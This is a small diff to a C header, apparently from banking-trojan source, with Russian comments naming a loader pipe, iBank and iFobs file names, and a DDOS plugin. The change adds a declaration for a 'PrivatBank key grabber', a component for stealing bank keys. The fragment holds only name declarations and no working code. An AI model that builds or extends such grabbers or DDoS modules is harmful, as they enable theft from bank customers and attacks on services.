@@ -65,6 +65,10 @@ extern CSSTR EStrConfigHPFileName[]; // Имя файла хранения конфига повышенного п
 
 
 
+//Имя систем граберов
+extern CSSTR EStrSystemPrivat[]; // Грабер ключей приватбанка
+
+
 // Имена служебный пайпов
 extern CSSTR EStrPipeLoader[]; // Имя служебного пайпа лоадера
 
@@ -142,7 +146,7 @@ extern CSSTR EStrIBankFileName[];
 extern CSSTR IFobsFlagCopy[];
 
 
-	// Имя плагина DDOS
+// Имя плагина DDOS
 extern CSSTR EStrDDOSPlugin[];
 
 // Имя файла данных для команды DDOS
